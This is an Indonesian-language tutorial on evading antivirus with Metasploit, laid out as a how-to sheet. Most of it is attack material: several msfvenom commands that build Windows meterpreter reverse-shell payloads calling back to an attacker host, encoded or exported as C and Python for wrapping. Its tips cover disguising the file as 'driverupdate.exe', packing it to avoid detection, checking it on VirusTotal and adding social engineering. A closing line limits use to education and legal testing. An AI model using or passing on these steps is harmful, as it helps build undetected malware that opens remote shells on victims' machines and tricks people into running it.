# Bypass Antivirus (AV) dengan Metasploit Framework

## A. Kenapa Perlu Bypass AV?

Saat payload buatan Metasploit dieksekusi di sistem target, antivirus modern bisa langsung mendeteksi dan memblokirnya. Oleh karena itu, bypass AV menjadi langkah penting agar payload dapat berjalan tanpa terdeteksi.

## B. Teknik Umum Bypass AV

| Teknik | Deskripsi |
|:--:|:-:|
| Encoding Payload | Mengacak struktur payload agar tidak dikenali signature AV |
| Packing / Obfuscation | Membungkus file dengan enkripsi atau modifikasi struktur file | 
| Custom Payload Wrapper | Menulis skrip sendiri dalam Python/C/VB yang menjalankan shellcode |
| Menghindari Signature Payload	| Tidak menggunakan payload default bawaan Metasploit |

## C. Bypass AV dengan Encoder Metasploit Framework

Gunakan encoder saat membuat payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell_encoded.exe
```

**Keterangan:**

- `-e`: Encoder (contoh: `x86/shikata_ga_nai`)
- `-i`: Iterasi encoder (semakin banyak, semakin acak tapi bisa tidak stabil)

**Encoder Populer di Metasploit:**

- `x86/shikata_ga_nai`
- `cmd/powershell_base64`
- `x86/countdown`
- `x86/jmp_call_additive`

Cek semua encoder:

```
msfvenom --list encoders
```

## D. Membungkus Payload dalam Bahasa Pemrograman Lain

### 1. Format C

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c > payload.c
```

Compile secara manual dan modifikasi kode untuk menyisipkan ke aplikasi.

### 2. Format Python:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python > payload.py
```

Bisa dikonversi ke `.exe` dengan `pyinstaller`, dan payload dapat disamarkan.

## E. Tips Tambahan

| Tips | Penjelasan |
|:--:|:-:|
| Ganti nama file | Gunakan nama umum seperti driverupdate.exe |
| Obfuscate | Gunakan tool seperti `UPX`, `PyArmor`, `dll` |
| Test | Gunakan VirusTotal untuk uji deteksi |
| Ganti payload | Hindari payload yang umum seperti `meterpreter/reverse_tcp` |
| Social Engineering | Gabungkan dengan file asli atau teknik persuasi |


## F. Catatan Penting

- Teknik bypass AV tidak menjamin selalu berhasil.
- AV signature terus diperbarui → butuh improvisasi & eksperimen.
- Gunakan hanya untuk tujuan edukasi dan pengujian legal.
